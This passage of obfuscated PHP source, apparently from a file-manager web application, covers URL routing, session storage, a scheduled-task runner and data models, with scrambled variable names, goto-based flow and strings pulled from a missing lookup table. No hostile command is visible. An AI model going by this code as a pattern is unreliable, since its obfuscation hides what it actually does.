$E”È¡·¯ÂÔ[2]; } else { $b‚ç—ÛË÷Ò = null; $aÒÅ×µ³Àö = strpos($E”È¡·¯ÂÔ[0], $cš„ù”ÔÛÌ[18]) === 0 ? $E”È¡·¯ÂÔ[0] : $cš„ù”ÔÛÌ[18] . $E”È¡·¯ÂÔ[0]; $eÄğ°Ä¬† = $E”È¡·¯ÂÔ[1]; } array_push(self::$maps, $b‚ç—ÛË÷Ò); array_push(self::$routes, $aÒÅ×µ³Àö); array_push(self::$methods, strtoupper($Cù¼™ãÔƒº)); array_push(self::$callbacks, $eÄğ°Ä¬†); } public static function error($DÒè–Ó«»Ñ) { self::$errorCallback = $DÒè–Ó«»Ñ; } public static function haltOnMatch($C²÷Å¶©² = true) { self::$halts = $C²÷Å¶©²; } public static function dispatch() { goto CÃƒˆÍê¤É; aæŞê‡—‹•: self::$routes = preg_replace($aƒ¼’ëÓ·†[1070], $aƒ¼’ëÓ·†[18], self::$routes); if (in_array($BÑöãó±Ìƒ, self::$routes)) { $a›ß–ƒ‰ñ = array_keys(self::$routes, $BÑöãó±Ìƒ); foreach ($a›ß–ƒ‰ñ as $d ¨äá‡¤œ) { if (self::$methods[$d ¨äá‡¤œ] == $BŞÛÏŠöº² || self::$methods[$d ¨äá‡¤œ] == $aƒ¼’ëÓ·†[1386] || in_array($BŞÛÏŠöº², self::$maps[$d ¨äá‡¤œ])) { $A¦™İØƒ½ç = !0; if (!is_object(self::$callbacks[$d ¨äá‡¤œ])) { $fÕÒÄÎ“ƒ± = explode($aƒ¼’ëÓ·†[18], self::$callbacks[$d ¨äá‡¤œ]); $bš­¯˜É— = end($fÕÒÄÎ“ƒ±); $FŒ¥¢¶Ø¨ = explode($aƒ¼’ëÓ·†[1387], $bš­¯˜É—); $D©İËªÍ™À = new $FŒ¥¢¶Ø¨[0](); $D©İËªÍ™À->{$FŒ¥¢¶Ø¨[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$d ¨äá‡¤œ]); if (self::$halts) { return; } } } } } else { $A’Â¤ˆ¡¶ƒ = 0; foreach (self::$routes as $d ¨äá‡¤œ) { if (strpos($d ¨äá‡¤œ, $aƒ¼’ëÓ·†[14]) !== !1) { $d ¨äá‡¤œ = str_replace($e¶é¤Øç•, $dÀ§õêÓ¨, $d ¨äá‡¤œ); } if (preg_match($aƒ¼’ëÓ·†[1388] . $d ¨äá‡¤œ . $aƒ¼’ëÓ·†[1389], $BÑöãó±Ìƒ, $C·âæ§Şİ)) { if (self::$methods[$A’Â¤ˆ¡¶ƒ] == $BŞÛÏŠöº² || self::$methods[$A’Â¤ˆ¡¶ƒ] == $aƒ¼’ëÓ·†[1386] || !empty(self::$maps[$A’Â¤ˆ¡¶ƒ]) && in_array($BŞÛÏŠöº², self::$maps[$A’Â¤ˆ¡¶ƒ])) { $A¦™İØƒ½ç = !0; array_shift($C·âæ§Şİ); if (!is_object(self::$callbacks[$A’Â¤ˆ¡¶ƒ])) { $fÕÒÄÎ“ƒ± = explode($aƒ¼’ëÓ·†[18], self::$callbacks[$A’Â¤ˆ¡¶ƒ]); $bš­¯˜É— = end($fÕÒÄÎ“ƒ±); $FŒ¥¢¶Ø¨ = explode($aƒ¼’ëÓ·†[1387], $bš­¯˜É—); $D©İËªÍ™À = new $FŒ¥¢¶Ø¨[0](); if (!method_exists($D©İËªÍ™À, $FŒ¥¢¶Ø¨[1])) { echo $aƒ¼’ëÓ·†[1390]; } else { call_user_func_array(array($D©İËªÍ™À, $FŒ¥¢¶Ø¨[1]), $C·âæ§Şİ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$A’Â¤ˆ¡¶ƒ], $C·âæ§Şİ); if (self::$halts) { return; } } } } $A’Â¤ˆ¡¶ƒ++; } } if ($A¦™İØƒ½ç == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $AÄ¡÷‡ËÈ² =& $_SERVER[©]; header($_SERVER[$AÄ¡÷‡ËÈ²[1391]] . $AÄ¡÷‡ËÈ²[1392]); echo $AÄ¡÷‡ËÈ²[1393]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$aƒ¼’ëÓ·†[1385]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto b¶ïŸÆÌ¯; EŸ‹±ëëÙŸ: $e¶é¤Øç• = array_keys(static::$patterns); $dÀ§õêÓ¨ = array_values(static::$patterns); $A¦™İØƒ½ç = !1; goto aæŞê‡—‹•; CÃƒˆÍê¤É: $aƒ¼’ëÓ·† =& $_SERVER[©]; $BÑöãó±Ìƒ = parse_url($_SERVER[$aƒ¼’ëÓ·†[1385]], PHP_URL_PATH); $BŞÛÏŠöº² = $_SERVER[$aƒ¼’ëÓ·†[164]]; goto EŸ‹±ëëÙŸ; b¶ïŸÆÌ¯: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto b½ƒˆÖßİå; B¼¡Ñ¤Ñ×Å: $Aê¾í¬§… = $GLOBALS[$E‘ÍêÔ÷¿[16]][$E‘ÍêÔ÷¿[346]]; self::$sessionTime = $Aê¾í¬§…[$E‘ÍêÔ÷¿[1394]]; $c…‹º»Ãã = SESSION_ID; goto fªË¶°©; AÚï¢¢Ñ¤İ: $cï¥±Ÿ‘Çâ = $Aê¾í¬§…[$E‘ÍêÔ÷¿[1396]]; $cõÛó‘îœ = $Aê¾í¬§…[$cï¥±Ÿ‘Çâ]; $C‚ß¨²Ç„• = $Aê¾í¬§…[$E‘ÍêÔ÷¿[755]]; goto A·šÆ‘Í™›; c‚œÅ¶æœÓ: return $A‹÷Ø¤³Ñä; goto bµÈŠŠ½óŞ; A·šÆ‘Í™›: switch ($cï¥±Ÿ‘Çâ) { case $E‘ÍêÔ÷¿[27]: self::$handle = Model($E‘ÍêÔ÷¿[756]); break; case $E‘ÍêÔ÷¿[757]: self::$handle = new CacheRedis($cõÛó‘îœ, $C‚ß¨²Ç„•); break; case $E‘ÍêÔ÷¿[758]: self::$handle = new CacheMemcached($cõÛó‘îœ, $C‚ß¨²Ç„•); break; case $E‘ÍêÔ÷¿[177]: $cõÛó‘îœ[$E‘ÍêÔ÷¿[85]] = $cõÛó‘îœ[$E‘ÍêÔ÷¿[85]] . $E‘ÍêÔ÷¿[1397]; self::$handle = new CacheFile($cõÛó‘îœ, $C‚ß¨²Ç„•); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $A‹÷Ø¤³Ñä = new self(); goto c‚œÅ¶æœÓ; b½ƒˆÖßİå: $E‘ÍêÔ÷¿ =& $_SERVER[©]; static $A‹÷Ø¤³Ñä = false; if ($A‹÷Ø¤³Ñä) { return $A‹÷Ø¤³Ñä; } goto B¼¡Ñ¤Ñ×Å; fªË¶°©: $c…‹º»Ãã = _get($GLOBALS, $E‘ÍêÔ÷¿[1395], $c…‹º»Ãã); if (self::$sessionSign) { } else { if (Cookie::get($c…‹º»Ãã)) { self::$sessionSign = Cookie::get($c…‹º»Ãã); } else { self::$sessionSign = guid(); } } Cookie::setSafe($c…‹º»Ãã, self::$sessionSign, self::$sessionTime); goto AÚï¢¢Ñ¤İ; bµÈŠŠ½óŞ: } public static function sign($Fùß¡Áã‚› = false) { $Fùß¡Áã‚› && (self::$sessionSign = $Fùß¡Áã‚›); self::init(); return self::$sessionSign; } public static function set($B‘„âŸù¨ß, $aê¾¹‰ê¾Ì = false) { self::init(); if (is_array($B‘„âŸù¨ß)) { foreach ($B‘„âŸù¨ß as $aÍ†Ü‡’Êè => $FñÒ“çºÇå) { array_set_value(self::$data, $aÍ†Ü‡’Êè, $FñÒ“çºÇå); } } else { array_set_value(self::$data, $B‘„âŸù¨ß, $aê¾¹‰ê¾Ì); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($Dâ°ù®ğŒÄ = false) { self::init(); if (!$Dâ°ù®ğŒÄ) { return self::$data; } return array_get_value(self::$data, $Dâ°ù®ğŒÄ); } public static function remove($Dåì¦Ï“ï) { self::init(); unset(self::$data[$Dåì¦Ï“ï]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[©][760])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto cÄïöçã©; a¨ƒŞ·µµ°: http_close(); self::valueSet($fç†ÖÒõÙØ[1398], $fç†ÖÒõÙØ[93]); Hook::bind($fç†ÖÒõÙØ[1400], $fç†ÖÒõÙØ[1401]); goto e°´§Ê®ÖØ; e°´§Ê®ÖØ: while (!0) { self::cacheClear(); if (self::valueGet($fç†ÖÒõÙØ[688]) != $fç†ÖÒõÙØ[93]) { self::valueSet($fç†ÖÒõÙØ[1398], $fç†ÖÒõÙØ[476]); self::log($fç†ÖÒõÙØ[1402]); die; } self::valueSet($fç†ÖÒõÙØ[1398], $fç†ÖÒõÙØ[93]); self::valueSet($fç†ÖÒõÙØ[1399], time()); self::taskRunAll(); sleep(self::valueGet($fç†ÖÒõÙØ[1403])); } goto E¹öñ§æ²Æ; cÄïöçã©: $fç†ÖÒõÙØ =& $_SERVER[©]; if (self::valueGet($fç†ÖÒõÙØ[688]) != $fç†ÖÒõÙØ[93]) { return; } if (self::valueGet($fç†ÖÒõÙØ[1398]) == $fç†ÖÒõÙØ[93]) { $d‚…á¾‚–Æ = self::valueGet($fç†ÖÒõÙØ[1399]); if (time() - $d‚…á¾‚–Æ > 3600 * 2) { self::restart(); } return; } goto a¨ƒŞ·µµ°; E¹öñ§æ²Æ: } public static function restart() { $fèµ¾·è‹å =& $_SERVER[©]; http_close(); self::valueSet($fèµ¾·è‹å[688], $fèµ¾·è‹å[476]); sleep(self::valueGet($fèµ¾·è‹å[1403]) + 5); self::valueSet($fèµ¾·è‹å[1398], $fèµ¾·è‹å[476]); self::valueSet($fèµ¾·è‹å[688], $fèµ¾·è‹å[93]); } public static function shutdownEvent() { $C«æ÷ä¯§î =& $_SERVER[©]; self::valueSet($C«æ÷ä¯§î[1398], $C«æ÷ä¯§î[476]); self::log($C«æ÷ä¯§î[1404]); } public static function config($aèáÔ”‚õ¨, $f¥­Ô×ŞŠ®) { $b¨Å£ñ™ =& $_SERVER[©]; $C’ ‚‹‡Åº = 20; $f¥­Ô×ŞŠ® = intval($f¥­Ô×ŞŠ®) <= $C’ ‚‹‡Åº ? $C’ ‚‹‡Åº : intval($f¥­Ô×ŞŠ®); self::valueSet($b¨Å£ñ™[688], $aèáÔ”‚õ¨); self::valueSet($b¨Å£ñ™[1403], $f¥­Ô×ŞŠ®); } private static function taskRunAll() { $BÚî§ÂéëÜ =& $_SERVER[©]; $dÊ†„öö¿ = Model($BÚî§ÂéëÜ[1405])->listData(); $fÂ–¶ßÕ± = count($dÊ†„öö¿); for ($a‘ÏÔ¶ÅŞ• = 0; $a‘ÏÔ¶ÅŞ• < $fÂ–¶ßÕ±; $a‘ÏÔ¶ÅŞ•++) { $Fí‰º³ˆÛ˜ = $dÊ†„öö¿[$a‘ÏÔ¶ÅŞ•]; if ($Fí‰º³ˆÛ˜[$BÚî§ÂéëÜ[1406]] != $BÚî§ÂéëÜ[93]) { continue; } if (!self::taskTimeCheck($Fí‰º³ˆÛ˜)) { continue; } self::taskRun($Fí‰º³ˆÛ˜); } Hook::trigger($BÚî§ÂéëÜ[1407]); } private static function taskTimeCheck($bÏ´äğêí) { goto aÂ«Áƒ˜; aÂ«Áƒ˜: $b‹¤”Áåøã =& $_SERVER[©]; $D³¬‘ƒ£ä = json_decode($bÏ´äğêí[$b‹¤”Áåøã[200]], !0); $c¾ßÑµÓ˜¢ = intval($bÏ´äğêí[$b‹¤”Áåøã[1399]]); goto dÂÏ¶óƒë; dÂÏ¶óƒë: $C§‘£§Üç = strtotime($b‹¤”Áåøã[1408] . $D³¬‘ƒ£ä[$b‹¤”Áåøã[1409]] . $b‹¤”Áåøã[1410]) - strtotime($b‹¤”Áåøã[1411]); $BÕøµË©†Ñ = time() - strtotime(date($b‹¤”Áåøã[1412]) . $b‹¤”Áåøã[1413]); $C÷³“ÛÂÑà = $BÕøµË©†Ñ >= $C§‘£§Üç && $BÕøµË©†Ñ <= $C§‘£§Üç + 3600; goto eíô¶›ƒ¬’; eíô¶›ƒ¬’: switch ($D³¬‘ƒ£ä[$b‹¤”Áåøã[39]]) { case $b‹¤”Áåøã[1414]: if (time() - $c¾ßÑµÓ˜¢ < 3600 * 24 * 30) { return !1; } if ($D³¬‘ƒ£ä[$b‹¤”Áåøã[1414]] == date($b‹¤”Áåøã[1415]) && $C÷³“ÛÂÑà) { return !0; } break; case $b‹¤”Áåøã[1416]: if (time() - $c¾ßÑµÓ˜¢ < 3600 * 24 * 7) { return !1; } $fÉÒ‚ì˜Ü‘ = date($b‹¤”Áåøã[1417]) == 0 ? 7 : date($b‹¤”Áåøã[1417]); if ($D³¬‘ƒ£ä[$b‹¤”Áåøã[1416]] == $fÉÒ‚ì˜Ü‘ && $C÷³“ÛÂÑà) { return !0; } break; case $b‹¤”Áåøã[1409]: if (time() - $c¾ßÑµÓ˜¢ < 3600 * 24) { return !1; } if ($C÷³“ÛÂÑà) { return !0; } break; case $b‹¤”Áåøã[1418]: if (time() - $c¾ßÑµÓ˜¢ >= floatval($D³¬‘ƒ£ä[$b‹¤”Áåøã[1418]]) * 60) { return !0; } break; default: break; } return !1; goto C½ÏòéîŠÍ; C½ÏòéîŠÍ: } public static function taskRun($fÀ©ŠØ™”‹) { goto EœÆ•çÚæ; EœÆ•çÚæ: $dîœŒˆš¸ =& $_SERVER[©]; self::log($dîœŒˆš¸[1419] . $fÀ©ŠØ™”‹[$dîœŒˆš¸[375]] . $dîœŒˆš¸[1420] . $fÀ©ŠØ™”‹[$dîœŒˆš¸[38]] . $dîœŒˆš¸[1421] . $fÀ©ŠØ™”‹[$dîœŒˆš¸[1422]]); Model($dîœŒˆš¸[1405])->run($fÀ©ŠØ™”‹[$dîœŒˆš¸[375]]); goto d®Å°í„ëì; dœöòéõº: Model($dîœŒˆš¸[1423])->add(array($dîœŒˆš¸[1424] => $dîœŒˆš¸[43], $dîœŒˆš¸[1425] => $dîœŒˆš¸[476], $dîœŒˆš¸[39] => $dîœŒˆš¸[1426] . $fÀ©ŠØ™”‹[$dîœŒˆš¸[375]], $dîœŒˆš¸[1427] => json_encode(array($dîœŒˆš¸[38] => $fÀ©ŠØ™”‹[$dîœŒˆš¸[38]], $dîœŒˆš¸[1428] => timeFloat() - $Cƒï…”ÙíÒ, $dîœŒˆš¸[290] => $fß´‹Ö£ìƒ)))); self::log($dîœŒˆš¸[1429] . $fÀ©ŠØ™”‹[$dîœŒˆš¸[375]] . $dîœŒˆš¸[1430] . $fß´‹Ö£ìƒ); return !0; goto C‹Ïˆ¿œ×; d®Å°í„ëì: $Cƒï…”ÙíÒ = timeFloat(); $fß´‹Ö£ìƒ = $dîœŒˆš¸[43]; switch ($fÀ©ŠØ™”‹[$dîœŒˆš¸[39]]) { case $dîœŒˆš¸[304]: $e–Ì†‡Ê¦Ü = url_request($fÀ©ŠØ™”‹[$dîœŒˆš¸[1422]], $dîœŒˆš¸[226], !1, !1, !1, !1, 5); $fß´‹Ö£ìƒ = strlen($e–Ì†‡Ê¦Ü); break; case $dîœŒˆš¸[225]: $fß´‹Ö£ìƒ = Hook::apply($fÀ©ŠØ™”‹[$dîœŒˆš¸[1422]]); default: break; } goto dœöòéõº; C‹Ïˆ¿œ×: } private static function valueGet($bƒ‰‚áí×Ñ) { $dÎŸç§Û½À =& $_SERVER[©]; $DŠÔƒ‹Æ = $dÎŸç§Û½À[1431]; $DøºÜâìÈÙ = Model($dÎŸç§Û½À[1432])->get($bƒ‰‚áí×Ñ, $DŠÔƒ‹Æ); if (is_null($DøºÜâìÈÙ)) { Model($dÎŸç§Û½À[1432])->set($dÎŸç§Û½À[1403], 10, $DŠÔƒ‹Æ); Model($dÎŸç§Û½À[1432])->set($dÎŸç§Û½À[688], $dÎŸç§Û½À[93], $DŠÔƒ‹Æ); Model($dÎŸç§Û½À[1432])->set($dÎŸç§Û½À[1398], $dÎŸç§Û½À[476], $DŠÔƒ‹Æ); $DøºÜâìÈÙ = Model($dÎŸç§Û½À[1432])->get($bƒ‰‚áí×Ñ, $DŠÔƒ‹Æ); } return $DøºÜâìÈÙ; } private static function valueSet($CÆ¬‰Ù¾ƒ‘, $EËÊãÜ…Øñ) { $E™ãÊäà =& $_SERVER[©]; return Model($E™ãÊäà[1432])->set($CÆ¬‰Ù¾ƒ‘, $EËÊãÜ…Øñ, $E™ãÊäà[1431]); } protected static function log($dŒ’³ÍÏ˜©) { write_log($dŒ’³ÍÏ˜©, $_SERVER[©][1433]); } private static function cacheClear() { $Fº¨ŒÅ§Ê =& $_SERVER[©]; $D˜‰Ğ‰³ô‚ = Model($Fº¨ŒÅ§Ê[1432])->cacheKey($Fº¨ŒÅ§Ê[1431]); Cache::clearMemory($D˜‰Ğ‰³ô‚); } } goto dğÛÔŞ¶¸; e²ºŠäŠ©: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($BÛ˜¨æ­¢Ğ = false, $CĞÄšÒïöï = '', $C›’åŒõ„ï = false) { goto F°¯Š‘œÊ; BšöÖ”ÚøĞ: $this->cacheSet($CĞÄšÒïöï, $dÎØÍöÜ¤); $dÎØÍöÜ¤ = array_merge($a¾Œº‚Ê¢, $dÎØÍöÜ¤); return $BÛ˜¨æ­¢Ğ ? $dÎØÍöÜ¤[$BÛ˜¨æ­¢Ğ] : $dÎØÍöÜ¤; goto Eã”î¼œÈí; eÌˆóÂï: $a¾Œº‚Ê¢ = is_array($a¾Œº‚Ê¢) ? $a¾Œº‚Ê¢ : array(); if (is_array($dÎØÍöÜ¤)) { $dÎØÍöÜ¤ = array_merge($a¾Œº‚Ê¢, $dÎØÍöÜ¤); return $BÛ˜¨æ­¢Ğ ? isset($dÎØÍöÜ¤[$BÛ˜¨æ­¢Ğ]) ? $dÎØÍöÜ¤[$BÛ˜¨æ­¢Ğ] : null : $dÎØÍöÜ¤; } $dœµ–Áó = $this->filterWhere(array($f¦ˆƒÊ¥ƒ[39] => $CĞÄšÒïöï)); goto C»»é¦ÓÁÎ; F°¯Š‘œÊ: $f¦ˆƒÊ¥ƒ =& $_SERVER[©]; $dÎØÍöÜ¤ = $this->cacheGet($CĞÄšÒïöï); $a¾Œº‚Ê¢ = $this->optionDefault($CĞÄšÒïöï); goto eÌˆóÂï; C»»é¦ÓÁÎ: $dÎØÍöÜ¤ = $this->where($dœµ–Áó)->select(); $dÎØÍöÜ¤ = array_to_keyvalue($dÎØÍöÜ¤, $f¦ˆƒÊ¥ƒ[99], $f¦ˆƒÊ¥ƒ[368]); foreach ($dÎØÍöÜ¤ as $EÌ­ÕğÎ => $D¢¹­¨¼²) { if ($C›’åŒõ„ï || in_array($EÌ­ÕğÎ, $this->jsonField)) { $dÎØÍöÜ¤[$EÌ­ÕğÎ] = json_decode($D¢¹­¨¼², !0); } } goto BšöÖ”ÚøĞ; Eã”î¼œÈí: } public function set($DÚ–éÓá‰, $eÔ„½Üˆ…Î = false, $aÁ´ÌĞŠ˜Ä = '') { goto Aˆ¬‹åÒÕÂ; Aˆ¬‹åÒÕÂ: $Dõ‘¸‡¥§„ =& $_SERVER[©]; $this->cacheRemove($aÁ´ÌĞŠ˜Ä); $B”Ë§ğà‘ = array(); goto dÃˆ’‹İÙ¨; dÃˆ’‹İÙ¨: $cÚÌÜ‹ùÀ = is_array($DÚ–éÓá‰) ? $DÚ–éÓá‰ : array($DÚ–éÓá‰ => $eÔ„½Üˆ…Î); foreach ($cÚÌÜ‹ùÀ as $E“º·Á™ÂÔ => $CëÀ²ˆ¹) { if (is_array($CëÀ²ˆ¹)) { $CëÀ²ˆ¹ = json_encode_force($CëÀ²ˆ¹); } $this->checkLength($CëÀ²ˆ¹, !1, $this->tableName . $Dõ‘¸‡¥§„[14] . $DÚ–éÓá‰); $CëÀ²ˆ¹ = self::textEncode($CëÀ²ˆ¹); $cÚÌÜ‹ùÀ = array($Dõ‘¸‡¥§„[39] => $aÁ´ÌĞŠ˜Ä, $Dõ‘¸‡¥§„[99] => $E“º·Á™ÂÔ, $Dõ‘¸‡¥§„[368] => $CëÀ²ˆ¹); $B”Ë§ğà‘[] = $this->filterWhere($cÚÌÜ‹ùÀ); } if (!$B”Ë§ğà‘) { return !0; } goto f¯•Ó˜¯æ¼; f¯•Ó˜¯æ¼: return $this->addAll($B”Ë§ğà‘, array(), !0); goto AÉŸÔá‹¯ƒ; AÉŸÔá‹¯ƒ: } protected function optionDefault($eŸã¤Ú»·À = '') { return !1; } public function setDeep($A šğç¾Š¨, $e¯óæô³ã = false, $Bà ¼í¬ª = '') { $F«ì˜Šé¡ê = explode($_SERVER[©][101], $A šğç¾Š¨); $e’ùĞÛø®Ò = $this->get(); array_set_value($e’ùĞÛø®Ò, $A šğç¾Š¨, $e¯óæô³ã); $this->set($F«ì˜Šé¡ê[0], $e’ùĞÛø®Ò[$F«ì˜Šé¡ê[0]], $Bà ¼í¬ª); } public function remove($f©Øï‡‰¯ò, $A£…Ñâ‹– = '') { $aÀ½ÃìØ˜¦ =& $_SERVER[©]; $this->cacheRemove($A£…Ñâ‹–); $D±¬ƒ™è = $this->filterWhere(array($aÀ½ÃìØ˜¦[99] => $f©Øï‡‰¯ò, $aÀ½ÃìØ˜¦[39] => $A£…Ñâ‹–)); if (is_null($f©Øï‡‰¯ò)) { unset($D±¬ƒ™è[$aÀ½ÃìØ˜¦[99]]); } return $this->where($D±¬ƒ™è)->delete(); } public function cacheSet($C‡¢áĞ‚¹Ç, $DãÒë§µ»• = false) { return Cache::set($this->cacheKey($C‡¢áĞ‚¹Ç), $DãÒë§µ»•); } public function cacheGet($AŞö²°´ì) { return Cache::get($this->cacheKey($AŞö²°´ì)); } public function cacheRemove($BÂöÖ‘ßÄ) { return Cache::remove($this->cacheKey($BÂöÖ‘ßÄ)); } protected function filterWhere($F¬ß¦õËß™) { return $F¬ß¦õËß™; } protected function cacheKey($EˆÄÍÄ¤Ïî) { return $EˆÄÍÄ¤Ïî; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\x75\162\143\145"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\141\155\145" => "\151\157\137\x73\157\x75\162\x63\145\x5f\x6d\x65\x74\x61", "\x6d\x65\164\x61\x46\151\145\x6c\x64" => "\x73\157\165\x72\143\x65\111\104"); protected $dataAuto = array(array("\x6d\x6f\x64\151\x66\171\x54\151\155\145", "\x74\151\155\145", "\x69\x6e\x73\145\x72\164", "\146\165\x6e\143\164\151\x6f\156"), array("\143\x72\145\x61\x74\145\x54\151\155\145", "\164\x69\x6d\x65", "\151\x6e\163\145\162\x74", "\x66\165\156\x63\164\x69\x6f\156"), array("\x76\x69\145\167\x54\x69\x6d\145", "\x74\151\155\145", "\x69\x6e\163\x65\162\x74", "\x66\x75\x6e\x63\164\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($A¯•¨á÷„) { return $this->listSource(array($_SERVER[©][376] => $A¯•¨á÷„)); } public function typeName($b–¾–Ÿî»ã) { static $AŠæã“¯²Ö = array(self::TYPE_SYSTEM => "\163\x79\x73\164\x65\x6d", self::TYPE_USER => "\x75\163\145\162", self::TYPE_GROUP => "\147\162\x6f\x75\x70"); return $AŠæã“¯²Ö[$b–¾–Ÿî»ã . $_SERVER[©][43]]; } public function sourceListInfo($eà²ãÆ½†µ, $Bğ‰ÇĞˆ = false) { goto EËé†©µªò; d™õ¤ŒßÏ: return array_to_keyvalue($DÓ¦¥ç¶™, $E‰‰Íñ»Ù[377]); goto fˆÎéõŠõ“; DŠöÀŸÔ‹²: if (!$eà²ãÆ½†µ) { return array(); } $DÓ¦¥ç¶™ = $this->where(array($E‰‰Íñ»Ù[377] => array($E‰‰Íñ»Ù[17], $eà²ãÆ½†µ)))->select(); $this->_listDataApply($DÓ¦¥ç¶™, $Bğ‰ÇĞˆ); goto d™õ¤ŒßÏ; EËé†©µªò: $E‰‰Íñ»Ù =& $_SERVER[©]; $eà²ãÆ½†µ = $eà²ãÆ½†µ ? $eà²ãÆ½†µ : array(); $eà²ãÆ½†µ = array_filter(array_unique($eà²ãÆ½†µ)); goto DŠöÀŸÔ‹²; fˆÎéõŠõ“: } public function pathInfoFilter($bä‰ÓöĞÏ¢) { goto fÃ»î·‹Èá; E®ÊŒ‚²‹Š: $eàšÔØ†õÙ .= $EÅ—ã¥ŞÈ”[382]; $eàšÔØ†õÙ .= $EÅ—ã¥ŞÈ”[383]; $c…ˆº÷‘Ô„ = explode($EÅ—ã¥ŞÈ”[57], $eàšÔØ†õÙ); goto Bá’ƒÁ‰»…; D¼Òç¯ËÏ: $bä‰ÓöĞÏ¢[$EÅ—ã¥ŞÈ”[379]] = $this->typeName($bä‰ÓöĞÏ¢[$EÅ—ã¥ŞÈ”[379]]); if ($bä‰ÓöĞÏ¢[$EÅ—ã¥ŞÈ”[378]] != 1) { $bä‰ÓöĞÏ¢[$EÅ—ã¥ŞÈ”[170]] = $bä‰ÓöĞÏ¢[$EÅ—ã¥ŞÈ”[380]]; unset($bä‰ÓöĞÏ¢[$EÅ—ã¥ŞÈ”[380]]); } $eàšÔØ†õÙ = $EÅ—ã¥ŞÈ”[381]; goto E®ÊŒ‚²‹Š; Bá’ƒÁ‰»…: if (isset($bä‰ÓöĞÏ¢[$EÅ—ã¥ŞÈ”[384]]) && $bä‰ÓöĞÏ¢[$EÅ—ã¥ŞÈ”[384]][$EÅ—ã¥ŞÈ”[385]] == -1) { $c…ˆº÷‘Ô„ = array_remove_value($c…ˆº÷‘Ô„, $EÅ—ã¥ŞÈ”[197]); $c…ˆº÷‘Ô„ = array_remove_value($c…ˆº÷‘Ô„, $EÅ—ã¥ŞÈ”[117]); $c…ˆº÷‘Ô„ = array_remove_value($c…ˆº÷‘Ô„, $EÅ—ã¥ŞÈ”[386]); $c…ˆº÷‘Ô„ = array_remove_value($c…ˆº÷‘Ô„, $EÅ—ã¥ŞÈ”[387]); $c…ˆº÷‘Ô„ = array_remove_value($c…ˆº÷‘Ô„, $EÅ—ã¥ŞÈ”[87]); $c…ˆº÷‘Ô„ = array_remove_value($c…ˆº÷‘Ô„, $EÅ—ã¥ŞÈ”[388]); } $bä‰ÓöĞÏ¢ = array_field_key($bä‰ÓöĞÏ¢, $c…ˆº÷‘Ô„); return $bä‰ÓöĞÏ¢; goto a†„§á«é“; fÃ»î·‹Èá: $EÅ—ã¥ŞÈ” =& $_SERVER[©]; $bä‰ÓöĞÏ¢[$EÅ—ã¥ŞÈ”[85]] = KodIO::make($bä‰ÓöĞÏ¢[$EÅ—ã¥ŞÈ”[377]]); $bä‰ÓöĞÏ¢[$EÅ—ã¥ŞÈ”[39]] = $bä‰ÓöĞÏ¢[$EÅ—ã¥ŞÈ”[378]] == 1 ? $EÅ—ã¥ŞÈ”[86] : $EÅ—ã¥ŞÈ”[177]; goto D¼Òç¯ËÏ; a†„§á«é“: } public function listUserFav() { goto fäóª©™‚‚; dˆæÚ±µÁ: $BêØº† àš = array_to_keyvalue($BêØº† àš, $dµóÉÙªË®[43], $dµóÉÙªË®[85]); if ($BêØº† àš) { $a±ƒ¿‚œ ñ = $this->listSource(array($dµóÉÙªË®[391] => array($dµóÉÙªË®[392], $BêØº† àš))); } $a±ƒ¿‚œ ñ = array_to_keyvalue($a±ƒ¿‚œ ñ[$dµóÉÙªË®[363]], $dµóÉÙªË®[377]); goto bØÔ™óåŠ‚; fäóª©™‚‚: $dµóÉÙªË® =& $_SERVER[©]; $dÅßØ§×Ç„ = Model($dµóÉÙªË®[389])->listData(); $BêØº† àš = array_filter_by_field($dÅßØ§×Ç„, $dµóÉÙªË®[39], $dµóÉÙªË®[390]); goto dˆæÚ±µÁ; bØÔ™óåŠ‚: foreach ($dÅßØ§×Ç„ as &$DŸíÊ±”ñ) { $DŸíÊ±”ñ = array($dµóÉÙªË®[393] => $DŸíÊ±”ñ[$dµóÉÙªË®[375]], $dµóÉÙªË®[394] => $DŸíÊ±”ñ[$dµóÉÙªË®[38]], $dµóÉÙªË®[395] => $DŸíÊ±”ñ[$dµóÉÙªË®[85]], $dµóÉÙªË®[396] => $DŸíÊ±”ñ[$dµóÉÙªË®[39]], $dµóÉÙªË®[397] => $DŸíÊ±”ñ[$dµóÉÙªË®[197]], $dµóÉÙªË®[398] => $DŸíÊ±”ñ[$dµóÉÙªË®[117]]); if ($DŸíÊ±”ñ[$dµóÉÙªË®[39]] == $dµóÉÙªË®[390] && $a±ƒ¿‚œ ñ[$DŸíÊ±”ñ[$dµóÉÙªË®[85]]]) { $DŸíÊ±”ñ[$dµóÉÙªË®[399]] = $a±ƒ¿‚œ ñ[$DŸíÊ±”ñ[$dµóÉÙªË®[85]]]; } } return $dÅßØ§×Ç„; goto EŒ³‰Ô‰‘ˆ; EŒ³‰Ô‰‘ˆ: } public function listUserTag($E¥‘ŠÉØ‹—) { goto a£½Ğ‡ÔÂä; a£½Ğ‡ÔÂä: $f‹ÚÉÈ¯„ø =& $_SERVER[©]; $eì†÷ƒõ³ = 